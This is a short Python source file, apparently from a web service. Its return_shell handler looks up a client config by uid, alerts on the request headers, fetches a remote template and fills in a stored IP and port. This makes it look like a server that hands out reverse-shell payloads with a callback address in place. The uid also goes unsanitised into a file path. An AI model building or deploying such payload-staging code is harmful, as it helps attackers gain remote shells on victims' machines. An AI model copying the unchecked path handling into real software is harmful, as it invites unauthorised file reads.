from ecs.alert import *
from ecs.funcs import *
import requests



def return_shell(url,request):
    data = request.args
    uid = data.get('uid')
    detail = read_file(f'clients/{uid}/{uid}.conf')
    app.logger.info(f'{type(detail)}')
    if detail:
        try:
            detail["header"]=request.headers
            alert(detail)
        except Exception as e:
            app.logger.error(e)
        response = requests.get(url)
        if response.status_code == 200:
            data = response.text
            app.logger.info(f'{detail["ip"]},{detail["port"]}')
            response_text = replace(data,detail["ip"], detail["port"])
            return response_text
        else:
            app.logger.error(f"Failed to retrieve data from {url}: {response.status_code}")
            return f"Failed to retrieve data: {response.status_code}", 500
    else:
        app.logger.error(f"Detail file not found for UID: {uid}")
        return "Error: Detail file not found", 404